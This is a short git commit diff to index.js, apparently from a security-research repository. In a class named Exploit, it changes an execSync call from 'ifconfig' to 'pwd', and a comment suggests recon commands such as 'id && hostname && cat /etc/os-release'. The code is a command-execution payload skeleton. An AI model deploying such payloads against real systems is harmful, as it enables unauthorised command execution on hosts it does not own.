915ef82d10309b7e683e7f10491905acde705ea8
vintage-secs <114360930+vintage-secs@users.noreply.github.com>
2026-07-07 23:50:59 +0530

    Update index.js

--- index.js
+++ index.js
@@ -3,7 +3,7 @@ class Exploit {
     // Require Node.js modules and execute system commands
     const { execSync } = require('child_process');
     // Run any system command. Example: 'id && hostname && cat /etc/os-release'
-    const output = execSync('ifconfig').toString();
+    const output = execSync('pwd').toString();
     return { status: 'ok', data: { result: output } };
   }
 }
